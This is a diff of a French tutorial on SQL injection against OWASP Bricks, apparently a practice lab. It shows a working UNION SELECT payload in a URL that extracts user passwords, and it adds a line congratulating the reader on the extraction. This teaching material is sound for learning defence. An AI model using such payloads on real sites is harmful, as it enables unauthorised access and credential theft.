@@ -379,3 +379,5 @@ Par exemple `LIMIT 4,1` affiche le mot de passe du 4ème utilisateur.
 URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+password,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+users+LIMIT+4,1;-- `
 
 ![Requête avec LIMIT 4,1 qui affiche donc la 4ème ligne de la table _users_](images/limit4-1.png)
+
+Félicitations, vous venez d'extraire des mot de passe d'une base de données en exploitant une injection SQL avec l'opérateur `UNION`.
